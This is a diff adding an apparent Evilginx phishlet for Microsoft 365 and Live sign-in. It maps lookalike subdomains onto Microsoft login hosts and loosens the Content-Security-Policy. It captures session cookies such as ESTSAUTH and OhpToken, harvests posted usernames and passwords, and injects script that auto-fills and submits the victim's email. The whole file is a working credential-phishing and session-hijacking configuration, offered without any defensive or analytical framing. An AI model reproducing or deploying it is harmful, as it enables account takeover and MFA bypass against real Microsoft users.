@@ -1,0 +1,118 @@
+name: "o365"
+author: "@sana88999"
+min_ver: "3.0.0"
+proxy_hosts:
+  - { phish_sub: "m365", orig_sub: "m365", domain: "cloud.microsoft", session: true, is_landing: false }
+  - { phish_sub: "office", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: true, auto_filter: false }
+  - { phish_sub: "react", orig_sub: "www", domain: "office.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "YWNjb", orig_sub: "login", domain: "live.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "vn3Hg", orig_sub: "aadcdn", domain: "msauth.net", session: true, is_landing: false }
+  
+sub_filters:
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: '<meta http-equiv="Content-Security-Policy" content="(.*?)"', replace: '<meta http-equiv="Content-Security-Policy" content="default-src * data: blob: filesystem: about: ws: wss: ''unsafe-inline'' ''unsafe-eval''; script-src * data: blob: ''unsafe-inline'' ''unsafe-eval''; connect-src * data: blob: ''unsafe-inline''; img-src * data: blob: ''unsafe-inline''; frame-src * data: blob: ; style-src * data: blob: ''unsafe-inline''; font-src * data: blob: ''unsafe-inline'';"', regex: true, mimes: ["text/html"] }
+  - { triggers_on: ".*", orig_sub: "", domain: "microsoftonline.com", search: 'Set-Cookie: ([^=]+)=([^;]+)', replace: 'Set-Cookie: \1=\2; Path=/; Secure; SameSite=None; Partitioned', regex: true, headers: ["Set-Cookie"], mimes: ["text/html", "application/json"] }
+  - { triggers_on: "m365.cloud.microsoft", orig_sub: "m365", domain: "cloud.microsoft", search: 'Set-Cookie: ([^=]+)=', replace: 'Set-Cookie: \1=; Secure; SameSite=None; Partitioned', regex: true, headers: ["Set-Cookie"], mimes: ["text/html", "application/json"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"], redirect_only: true }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "text/javascript", "application/json"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "text/javascript", "application/json"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "text/javascript", "application/json"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "text/javascript", "application/json"] }
+  - { triggers_on: "login.live.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  
+
+auth_tokens:
+  # Consolidated Microsoft Online entries
+  - domain: ".microsoftonline.com"  # Wildcard covers all subdomains
+    keys: [
+      'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'esctx', 'SignInStateCookie',
+      'x-ms-request-id', 'fpc', 'brcap', 'Canary',
+      'x-ms-gateway-slice' ]
+
+  - domain: "login.microsoftonline.com"
+    keys: [ 'x-ms-gateway-slice', 'stsservicecookie', 'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'esctx', 'SignInStateCookie', 'AMAuth_', 'fpc' ]
+    
+  - domain: "m365.cloud.microsoft"
+    keys: [ 'OhpAuth', 'OhpToken', 'OH.SID', 'userid', 'AjaxSessionKey',
+      'PersonalizationCookie', 'msal.cache.encryption', 'ShCLSessionID', 'userid', 'p.DisplayCulture', 'OH.DCAffinity', 'OH.FLID', 'UserIndex'  ]
+    path: "/"
+    secure: true
+
+  # Enhanced Live.com coverage
+  - domain: ".live.com"
+    keys: [
+      'wlidperf', 'RPSSecAuth', 'NAP', 'uaid', 'MSPRequ',
+      'MSCC', 'MSPOK', 'OParams', 'ANON', 't', 'SessionID' ]
+
+
+
+force_post:
+  - path: "/ppsecure/post*"
+    search:
+      - { key: "LoginOptions", search: "1" }
+    force:
+      - { key: "DontShowAgain", value: "true" }
+    type: "post"
+
+auth_urls:
+  - "/landingv2"
+  - "/common/oauth2/nativeclient"
+  - "/m365/home"
+  - "/_layouts/15/clientbin.ashx"
+
+credentials:
+  username:
+    key: "(login|UserName|username|email|account|identifier|utemp)"
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: "(passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)"
+    search: '(.*)'
+    type: "post"
+  custom:
+    - key: '(passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD|API_HOST)'
+      search: '(.*)'
+      type: "post"
+
+
+login:
+  domain: "login.microsoftonline.com"
+  path: "/"
+  validators:
+    - cookie: "OhpToken"  # Most critical
+    - cookie: "ShCLSessionID"
+    - cookie: "PersonalizationCookie"
+  
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com", "m365.cloud.microsoft"]
+    trigger_paths: ["/common/oauth2/", "/login/"]
+    script: |
+      document.addEventListener("DOMContentLoaded", function() {
+        const email = new URLSearchParams(window.location.search).get('email');
+        
+        // Auto-fill email in all Microsoft iframes
+        const fillFrames = () => {
+          document.querySelectorAll('iframe').forEach(iframe => {
+            try {
+              const emailField = iframe.contentDocument.querySelector('input[type="email"]');
+              if (emailField && !emailField.value) {
+                emailField.value = email;
+                iframe.contentDocument.querySelector('button[type="submit"]').click();
+              }
+            } catch (e) {}
+          });
+        };
+        
+        fillFrames();
+        setInterval(fillFrames, 1000);  # Retry for dynamic iframes
+      });
